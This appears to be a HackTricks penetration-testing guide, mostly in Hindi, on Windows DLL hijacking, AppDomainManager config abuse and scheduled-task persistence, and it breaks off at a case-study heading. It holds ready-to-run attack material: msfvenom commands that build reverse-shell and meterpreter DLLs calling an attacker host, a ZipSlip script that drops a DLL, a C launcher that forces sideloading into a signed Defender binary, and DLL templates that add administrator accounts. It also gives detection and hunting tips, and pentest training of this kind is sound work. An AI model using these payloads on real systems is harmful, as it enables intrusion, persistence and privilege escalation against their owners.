# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## मूल जानकारी

DLL Hijacking में किसी trusted application को malicious DLL लोड करने के लिए manipulate किया जाता है। यह शब्द **DLL Spoofing, Injection, और Side-Loading** जैसी कई tactics को शामिल करता है। इसका मुख्य रूप से code execution और persistence प्राप्त करने के लिए, तथा कम सामान्य रूप से privilege escalation के लिए उपयोग किया जाता है। हालांकि यहां escalation पर ध्यान केंद्रित किया गया है, hijacking की method सभी objectives के लिए समान रहती है।

### सामान्य Techniques

DLL hijacking के लिए कई methods उपयोग की जाती हैं, जिनमें से प्रत्येक की effectiveness application की DLL loading strategy पर निर्भर करती है:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Genuine DLL को malicious DLL से बदलना, और original DLL की functionality बनाए रखने के लिए वैकल्पिक रूप से DLL Proxying का उपयोग करना।
2. **DLL Search Order Hijacking**: Malicious DLL को legitimate DLL से पहले आने वाले search path में रखना और application के search pattern का exploit करना।
3. **Phantom DLL Hijacking**: Application द्वारा लोड की जाने वाली malicious DLL बनाना, यह मानते हुए कि वह एक non-existent required DLL है।
4. **DLL Redirection**: `%PATH%` या `.exe.manifest` / `.exe.local` files जैसे search parameters को modify करके application को malicious DLL की ओर निर्देशित करना।
5. **WinSxS DLL Replacement**: WinSxS directory में legitimate DLL को malicious counterpart से बदलना। यह method अक्सर DLL side-loading से संबंधित होती है।
6. **Relative Path DLL Hijacking**: Copied application के साथ malicious DLL को user-controlled directory में रखना, जो Binary Proxy Execution techniques के समान है।

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading किसी trusted **.NET Framework** process से attacker code लोड कराने का एकमात्र तरीका नहीं है। यदि target executable एक **managed** application है, तो CLR executable के नाम पर बनी **application configuration file** को भी consult करता है (उदाहरण के लिए `Setup.exe.config`)। यह file एक custom **AppDomainManager** को define कर सकती है। यदि config, EXE के पास रखी गई attacker-controlled assembly की ओर point करती है, तो CLR उसे **application के normal code path से पहले** लोड करता है और trusted process के अंदर run करता है।<sup>[[24]](#references)</sup>

Microsoft के .NET Framework configuration schema के अनुसार, custom manager के उपयोग के लिए `<appDomainManagerAssembly>` और `<appDomainManagerType>` दोनों का उपस्थित होना आवश्यक है।<sup>[[16]](#references)[[17]](#references)</sup>

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
न्यूनतम मैनेजर:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
व्यावहारिक नोट्स:
- यह **.NET Framework specific** tradecraft है। यह Win32 DLL search order के बजाय CLR config parsing पर निर्भर करता है।
- होस्ट वास्तव में एक **managed EXE** होना चाहिए। त्वरित triage: `sigcheck -m target.exe`, `corflags target.exe`, या PE metadata में **CLR Runtime Header** देखें।
- Config filename executable name से बिल्कुल मेल खाना चाहिए (`<binary>.config`) और आमतौर पर **EXE के साथ वाली directory** में होता है।
- यह **signed Microsoft/vendor binaries** के साथ उपयोगी है, क्योंकि trusted EXE अपरिवर्तित रहता है, जबकि malicious managed assembly in-process execute होती है।
- यदि आपके पास पहले से कोई writable installer/update directory है, तो AppDomainManager hijacking को **first stage** के रूप में उपयोग किया जा सकता है, जिसके बाद बाद के stages के लिए classic DLL sideloading या reflective loading किया जा सकता है।

### AppDomainManager as a downloader + scheduled-task bootstrap

एक व्यावहारिक intrusion pattern में trusted managed EXE को malicious `*.config` और malicious AppDomainManager DLL—जो केवल एक **small bootstrapper** के रूप में कार्य करता है—दोनों के साथ जोड़ा जाता है:<sup>[[25]](#references)</sup>

1. User किसी believable location, जैसे `%USERPROFILE%\Downloads`, से signed .NET installer या updater launch करता है।
2. साथ वाली config CLR को legitimate app logic शुरू होने से **पहले** attacker assembly load करने के लिए प्रेरित करती है।
3. Malicious manager एक **path gate** लागू करता है (उदाहरण के लिए, केवल तभी आगे बढ़ना जब host EXE `Downloads` से चल रहा हो, और second stage को केवल `%LOCALAPPDATA%` से run होने देना)।
4. यदि check सफल होता है, तो यह real payload को `%LOCALAPPDATA%\PerfWatson2.exe` जैसे user-writable path में download करता है और scheduled task के साथ persistence install करता है।

यह variant महत्वपूर्ण क्यों है:
- Signed host EXE अपरिवर्तित रहता है, इसलिए केवल main binary के hashes की जाँच करने वाला triage compromise को miss कर सकता है।
- सरल **path-based anti-analysis** सामान्य है: ZIP/EXE/DLL triad को Desktop, Temp या sandbox path पर ले जाने से chain जानबूझकर टूट सकती है।
- First-stage AppDomainManager DLL छोटी और low-noise रह सकती है, जबकि real implant बाद में fetch किया जाता है।

इस pattern के साथ अक्सर देखा जाने वाला minimal persistence example:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` का अर्थ उस user/session के लिए **highest available** है; यह अपने-आप में guaranteed SYSTEM escalation नहीं है।
- यह technique अक्सर classic missing-DLL search-order hijacking की तुलना में **.NET config abuse के माध्यम से execution/persistence** के रूप में बेहतर वर्गीकृत की जाती है, हालांकि operators अक्सर दोनों को chain करते हैं।

Detection pivots:
- **ZIP extraction paths**, `Downloads`, `%TEMP%`, या अन्य user-writable folders से launch किए गए signed .NET executables, जिनके साथ colocated `<exe>.config` मौजूद हो।
- नए scheduled tasks, जिनका action `%LOCALAPPDATA%`, `%APPDATA%`, या `Downloads` के अंदर हो और जिनके names browser/vendor updaters जैसे हों।
- Short-lived managed bootstrap processes, जो तुरंत कोई अन्य EXE download करते हैं और फिर `schtasks.exe` spawn करते हैं।
- ऐसे samples जो जल्दी exit हो जाते हैं, जब तक executable path अपेक्षित user-profile directory से match न करे।

### मौजूदा scheduled task को hijack करके sideload chain को फिर से launch करना

Persistence के लिए केवल **creating a new task** पर ध्यान न दें। कुछ intrusion sets तब तक प्रतीक्षा करते हैं जब तक कोई legitimate installer एक **normal updater task** create न कर दे, और फिर **task action को rewrite** कर देते हैं, ताकि existing name, author और trigger defenders को परिचित ही दिखें।

Reusable workflow:
1. Legitimate software को install/run करें और उस task की पहचान करें जिसे वह सामान्यतः create करता है।
2. Task XML export करें और वर्तमान `<Exec><Command>` / `<Arguments>` values नोट करें।<sup>[[23]](#references)</sup>
3. केवल action को replace करें, ताकि task किसी user-writable staging directory से आपका **trusted host EXE** start करे, जो फिर real payload को side-load या AppDomain-load करता है।
4. नया स्पष्ट persistence artifact create करने के बजाय उसी task name को फिर से register करें।
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
यह अधिक stealthy क्यों है:
- Task name अभी भी legitimate दिख सकता है (उदाहरण के लिए vendor updater)।
- **Task Scheduler service** इसे launch करती है, इसलिए parent/ancestor validation में अक्सर `explorer.exe` के बजाय expected scheduling chain दिखाई देती है।
- DFIR teams जो केवल **new task names** की तलाश करती हैं, वे ऐसे task को miss कर सकती हैं जिसका registration पहले से मौजूद था, लेकिन जिसका action अब `%LOCALAPPDATA%`, `%APPDATA%`, या किसी अन्य attacker-controlled path की ओर point करता है।

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML और `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata की baseline के साथ तुलना करें।
- जब कोई **vendor-looking updater task** **user-writable directories** से execute हो या colocated `*.config` file के साथ .NET EXE launch करे, तो alert करें।

> [!TIP]
> HTML staging, AES-CTR configs और .NET implants को DLL sideloading के ऊपर layer करने वाली step-by-step chain के लिए नीचे दिए गए workflow को review करें।

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Missing DLLs ढूँढना

System के अंदर missing Dlls ढूँढने का सबसे common तरीका sysinternals से [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) चलाना और **following 2 filters** **set करना** है:

![Common Techniques - Missing Dlls ढूँढना: System के अंदर missing Dlls ढूँढने का सबसे common तरीका sysinternals से procmon चलाना और following 2 filters set करना है](<../../../images/image (961).png>)

![Common Techniques - Missing Dlls ढूँढना: System के अंदर missing Dlls ढूँढने का सबसे common तरीका sysinternals से procmon चलाना और following 2 filters set करना है](<../../../images/image (230).png>)

और केवल **File System Activity** दिखाएँ:

![Common Techniques - Missing Dlls ढूँढना: और केवल File System Activity दिखाएँ](<../../../images/image (153).png>)

यदि आप **missing dlls in general** ढूँढ रहे हैं, तो इसे कुछ **seconds** तक **चलता रहने दें**।\
यदि आप **specific executable के अंदर missing DLL** ढूँढ रहे हैं, तो **"Process Name" "contains" `<exec name>`** जैसा एक और filter set करें, उसे execute करें और events की capturing रोक दें।<sup>[[9]](#references)</sup>

## Missing DLLs का Exploitation

Privileges escalate करने के लिए ऐसी **DLL** खोजें जिसे कोई privileged process उस location से load करने की कोशिश करता है जहाँ आप write कर सकते हैं। ऐसा तब हो सकता है जब आप उस directory को control करते हैं जिसे legitimate DLL वाली directory से पहले search किया जाता है, या जब requested DLL मौजूद नहीं होती और आप searched directories में से किसी एक में write कर सकते हैं।

### Dll Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) के अंदर** आप यह जान सकते हैं कि Dlls को specifically कैसे load किया जाता है।

**Windows applications** DLLs को **pre-defined search paths** के एक set का पालन करते हुए, एक particular sequence में खोजती हैं। DLL hijacking की समस्या तब उत्पन्न होती है जब किसी harmful DLL को इन directories में से किसी एक में strategically रखा जाता है, जिससे वह authentic DLL से पहले load हो जाए। इसे रोकने का एक solution यह सुनिश्चित करना है कि application अपनी आवश्यक DLLs को refer करते समय absolute paths का उपयोग करे।

आप नीचे **32-bit** systems का **DLL search order** देख सकते हैं:

1. वह directory जहाँ से application ने load किया।
2. System directory। इस directory का path प्राप्त करने के लिए [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function का उपयोग करें।(_C:\Windows\System32_)
3. 16-bit system directory। इस directory का path प्राप्त करने वाला कोई function नहीं है, लेकिन इसे search किया जाता है। (_C:\Windows\System_)
4. Windows directory। इस directory का path प्राप्त करने के लिए [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function का उपयोग करें।
1. (_C:\Windows_)
5. Current directory।
6. वे directories जो PATH environment variable में listed हैं। ध्यान दें कि इसमें **App Paths** registry key द्वारा specified per-application path शामिल नहीं होता। DLL search path compute करते समय **App Paths** key का उपयोग नहीं किया जाता।

यह **SafeDllSearchMode** enabled होने पर default search order है। जब यह disabled होता है, तो current directory दूसरे स्थान पर आ जाती है। इस feature को disable करने के लिए **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value बनाएँ और इसे 0 पर set करें (default enabled है)।

यदि [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function को **LOAD_WITH_ALTERED_SEARCH_PATH** के साथ call किया जाता है, तो search उस executable module की directory से शुरू होती है जिसे **LoadLibraryEx** load कर रहा है।

अंत में, किसी DLL को name के बजाय absolute path से load किया जा सकता है। उस स्थिति में Windows DLL के लिए केवल उसी path को देखता है; name से requested dependencies फिर भी applicable search order का पालन करती हैं।

Search order को बदलने के अन्य तरीके भी हैं, लेकिन मैं उन्हें यहाँ explain नहीं करने वाला हूँ।

### Arbitrary file write को missing-DLL hijack में chain करना

1. **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) का उपयोग करके उन DLL names को collect करें जिन्हें process probe करता है लेकिन find नहीं कर पाता।<sup>[[14]](#references)</sup>
2. यदि binary किसी **schedule/service** पर run होती है, तो उन names में से किसी एक नाम वाली DLL को **application directory** (search-order entry #1) में drop करने पर वह अगली execution में load हो जाएगी। एक .NET scanner case में process ने `C:\samples\app\` में `hostfxr.dll` को `C:\Program Files\dotnet\fxr\...` से real copy load करने से पहले खोजा।
3. किसी भी export के साथ एक payload DLL (जैसे reverse shell) बनाएँ: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`।
4. यदि आपका primitive **ZipSlip-style arbitrary write** है, तो ऐसी ZIP बनाएँ जिसका entry extraction dir से बाहर निकल जाए, ताकि DLL app folder में पहुँच जाए:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Archive को watched inbox/share तक पहुँचाएँ; जब scheduled task process को फिर से launch करता है, तो यह malicious DLL को load करता है और service account के रूप में आपका code execute करता है।

### RTL_USER_PROCESS_PARAMETERS.DllPath के माध्यम से sideloading को बाध्य करना

नए बनाए गए process के DLL search path को निश्चित रूप से प्रभावित करने का एक advanced तरीका यह है कि process बनाते समय ntdll के native APIs के साथ RTL_USER_PROCESS_PARAMETERS में DllPath field सेट की जाए। यहाँ attacker-controlled directory प्रदान करके, किसी imported DLL को नाम से resolve करने वाले target process (जिसमें absolute path न हो और जो safe loading flags का उपयोग न करता हो) को उस directory से malicious DLL load करने के लिए बाध्य किया जा सकता है।

मुख्य विचार
- RtlCreateProcessParametersEx के साथ process parameters बनाएँ और एक custom DllPath प्रदान करें, जो आपके controlled folder (जैसे, वह directory जहाँ आपका dropper/unpacker मौजूद है) की ओर point करता हो।
- RtlCreateUserProcess के साथ process बनाएँ। जब target binary किसी DLL को नाम से resolve करता है, तो loader resolution के दौरान दिए गए DllPath से consult करेगा, जिससे reliable sideloading संभव होगी, भले ही malicious DLL target EXE के साथ colocated न हो।

Notes/limitations
- यह बनाए जा रहे child process को प्रभावित करता है; यह SetDllDirectory से अलग है, जो केवल current process को प्रभावित करता है।
- Target को किसी DLL को नाम से import या LoadLibrary करना चाहिए (कोई absolute path न हो और LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories का उपयोग न हो)।
- KnownDLLs और hardcoded absolute paths को hijack नहीं किया जा सकता। Forwarded exports और SxS precedence बदल सकते हैं।

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>RTL_USER_PROCESS_PARAMETERS.DllPath के माध्यम से DLL sideloading को बाध्य करने का Full C example</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- अपने DllPath directory में एक malicious xmllite.dll रखें (जो required functions export करती हो या real one को proxy करती हो)।
- ऊपर दी गई technique का उपयोग करके नाम से xmllite.dll की तलाश करने वाले किसी signed binary को launch करें। Loader, दिए गए DllPath के माध्यम से import को resolve करता है और आपकी DLL को sideload करता है।

यह technique real-world में multi-stage sideloading chains चलाने के लिए देखी गई है: एक initial launcher एक helper DLL drop करता है, जो फिर एक Microsoft-signed, hijackable binary को custom DllPath के साथ spawn करता है, ताकि staging directory से attacker की DLL load हो सके।<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** targets के लिए, application की adjacent **`.exe.config`** file का दुरुपयोग करके memory patch किए बिना **`Main()`** से पहले sideloading की जा सकती है। केवल Win32 DLL search order पर निर्भर रहने के बजाय, attacker एक legitimate .NET EXE को एक malicious config और एक या अधिक attacker-controlled assemblies के साथ रखता है।

Chain इस तरह काम करती है:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE start होता है और **CLR `<exe>.config` को पढ़ता है**।
2. Config **`<appDomainManagerAssembly>`** और **`<appDomainManagerType>`** सेट करती है, ताकि runtime एक attacker-controlled `AppDomainManager` को instantiate करे।
3. Malicious manager को trusted host process के अंदर **pre-`Main()` execution** मिल जाता है।
4. वही config CLR को local assemblies को पहले resolve करने के लिए बाध्य कर सकती है (उदाहरण के लिए `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) और inline patching के बिना runtime validation/telemetry को कमजोर कर सकती है।

Campaign-style pattern (directive / CLR version के अनुसार exact nesting अलग हो सकती है):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
यह उपयोगी क्यों है:
- **`<probing privatePath="."/>`** assembly resolution को application directory तक सीमित रखता है, जिससे यह folder एक पूर्वानुमानित sideloading surface बन जाता है।<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** CLR initialization के दौरान execution को attacker code में ले जाते हैं, इससे पहले कि legitimate app logic चले।<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** full-trust app को strong-name validation failure के बिना unsigned या tampered assemblies load करने दे सकता है।<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** publisher-policy redirects को newer assemblies की ओर जाने से रोकता है।<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** runtime selection को अधिक deterministic बनाता है।<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** विशेष रूप से महत्वपूर्ण है क्योंकि **CLR configuration के माध्यम से अपनी ETW visibility स्वयं disable करता है**, implant द्वारा memory में `EtwEventWrite` patch करने के बजाय।

हाल की campaigns में देखा गया operational pattern:
- Stage 1 में `setup.exe`, `setup.exe.config` और local assemblies drop की जाती हैं।
- Stage 2 में इन्हें एक विश्वसनीय दिखने वाले **AppData update** folder में copy किया जाता है, host का नाम `update.exe` जैसा रखा जाता है और इसे **scheduled task** के माध्यम से फिर से launch किया जाता है।
- Stage 3 में final RAT DLL/export load करने से पहले execution context verify किया जाता है, जैसे Task Scheduler से अपेक्षित parent `svchost.exe` है या नहीं।

Hunting ideas:
- User-writable locations में suspicious साथ वाली **`.config`** files के साथ चलने वाले signed या अन्यथा legitimate **.NET executables**।
- ऐसी `.config` files जिनमें **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** या **`etwEnable enabled="false"`** मौजूद हों।
- ऐसे scheduled tasks जो **`%LOCALAPPDATA%`** या app-specific `\bin\update\` directories से renamed update binaries को फिर से launch करते हों।
- Parent/child chains जिनमें scheduled task किसी trusted .NET host को launch करता है और वह तुरंत अपनी directory से non-vendor assemblies load करता है।

#### Windows docs में DLL search order के अपवाद

Windows documentation में standard DLL search order के कुछ अपवाद बताए गए हैं:

- जब ऐसी **DLL जिसका नाम पहले से memory में loaded DLL के समान हो** मिलती है, तो system सामान्य search को bypass कर देता है। इसके बजाय, default रूप से memory में मौजूद DLL पर निर्भर होने से पहले redirection और manifest की जांच की जाती है। **इस स्थिति में system DLL के लिए search नहीं करता**।
- जब DLL को वर्तमान Windows version के लिए **known DLL** के रूप में पहचाना जाता है, तो system search process को **छोड़कर**, known DLL के अपने version और उसकी dependent DLLs का उपयोग करेगा। Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** इन known DLLs की सूची रखती है।
- यदि किसी **DLL की dependencies** हों, तो इन dependent DLLs के लिए search ऐसे किया जाता है जैसे वे केवल अपने **module names** से निर्दिष्ट की गई हों, भले ही initial DLL को full path के माध्यम से पहचाना गया हो।

### Privileges बढ़ाना

**Requirements**:

- ऐसे process की पहचान करें जो **different privileges** (horizontal या lateral movement) के अंतर्गत operate करता हो या करेगा और जिसमें **DLL** missing हो।
- यह सुनिश्चित करें कि किसी भी ऐसे **directory** के लिए **write access** उपलब्ध हो जिसमें **DLL** की **search** की जाएगी। यह location executable की directory या system path के भीतर कोई directory हो सकती है।

ये prerequisites default रूप से uncommon हैं: privileged executables में आमतौर पर missing DLL dependencies नहीं होतीं और standard users सामान्यतः system search-path directories में write नहीं कर सकते। Misconfigured environments फिर भी दोनों conditions को उजागर कर सकते हैं।\
यदि requirements पूरी होती हैं, तो [UACME](https://github.com/hfiref0x/UACME) project देखें। हालांकि इसका मुख्य लक्ष्य UAC bypass है, इसमें specific Windows versions के लिए DLL-hijacking PoCs शामिल हैं, जिन्हें अक्सर आपके मिले writable directory के अनुसार adapt किया जा सकता है।

ध्यान दें कि आप किसी folder में अपनी **permissions check** इस तरह कर सकते हैं:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
और **PATH के अंदर मौजूद सभी folders की permissions check करें**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
आप किसी executable के imports और किसी dll के exports को भी इससे check कर सकते हैं:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**DLL Hijacking का उपयोग करके privileges escalate करने** के लिए **System Path folder** में write permissions के साथ पूरी guide के लिए देखें:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) यह जाँचेगा कि आपके पास system PATH के अंदर मौजूद किसी भी folder पर write permissions हैं या नहीं।\
इस vulnerability को discover करने के लिए अन्य उपयोगी automated tools **PowerSploit functions** हैं: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ और _Write-HijackDll._

### Example

यदि आपको कोई exploitable scenario मिलता है, तो उसे सफलतापूर्वक exploit करने के लिए सबसे महत्वपूर्ण चीजों में से एक होगी **ऐसी dll बनाना जो कम-से-कम उन सभी functions को export करे जिन्हें executable उससे import करेगा**। फिर भी, ध्यान दें कि DLL Hijacking [Medium Integrity level से High **(UAC को bypass करके)**](../../authentication-credentials-uac-and-efs/index.html#uac) या [**High Integrity से SYSTEM**](../index.html#from-high-integrity-to-system) तक escalate करने में उपयोगी होता है**।** आप **valid dll बनाने का तरीका** इस dll hijacking study में देख सकते हैं, जो execution के लिए DLL hijacking पर केंद्रित है: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**।**\
इसके अलावा, **अगले अनुभाग**n में आपको कुछ **basic dll codes** मिलेंगे, जो **templates** के रूप में या **non required functions exported वाली dll** बनाने के लिए उपयोगी हो सकते हैं।

## **Creating and compiling DLLs**

### **DLL Proxifying**

मूल रूप से **DLL proxy** एक ऐसी DLL होती है जो **लोड होने पर आपके malicious code को execute** करने में सक्षम होती है, साथ ही **real library को सभी calls relay करके** उसके अनुसार **expose** और **work** भी करती है।

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) या [**Spartacus**](https://github.com/Accenture/Spartacus) tool के साथ आप वास्तव में **एक executable indicate करके उस library को select कर सकते हैं जिसे आप proxify करना चाहते हैं और एक proxified dll generate कर सकते हैं**, या **DLL indicate करके एक proxified dll generate कर सकते हैं**।

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter (x86) प्राप्त करें:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**एक user बनाएँ (x86, मुझे x64 version नहीं मिला):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### आपका अपना

कई मामलों में, आपके द्वारा compile किए गए DLL को **victim process द्वारा import किए गए प्रत्येक function को export करना आवश्यक होता है**। यदि कोई आवश्यक export मौजूद नहीं है, तो binary उसे resolve नहीं कर सकती और exploit विफल हो जाता है।

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>user creation के साथ C++ DLL example</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>thread entry के साथ Alternate C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

